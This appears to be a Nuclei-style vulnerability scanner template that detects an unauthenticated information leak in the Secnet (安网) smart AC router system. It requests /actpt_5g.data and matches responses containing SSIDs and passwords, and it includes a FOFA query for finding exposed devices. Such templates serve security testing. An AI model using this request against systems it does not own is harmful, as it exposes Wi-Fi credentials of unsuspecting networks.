id: secnet-route-actpt_5g-infoleak

info:
  name: secnet-route-actpt_5g-infoleak
  author: yy
  severity: high
  tags: secnet,infoleak
  description: 安网智能AC管理系统存在信息漏洞
  metadata: 
    fofa-query: title="安网-智能路由系统" || header="HTTPD_ac 1.0"
    verified: true
    max-request: 1
 
http:
  - method: GET
    path:
      - "{{BaseURL}}/actpt_5g.data"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - ssids
          - passwd
          - ap_info
        condition: and
        part: body
        
      - type: word
        words:
          - text/html
        condition: and
        part: header     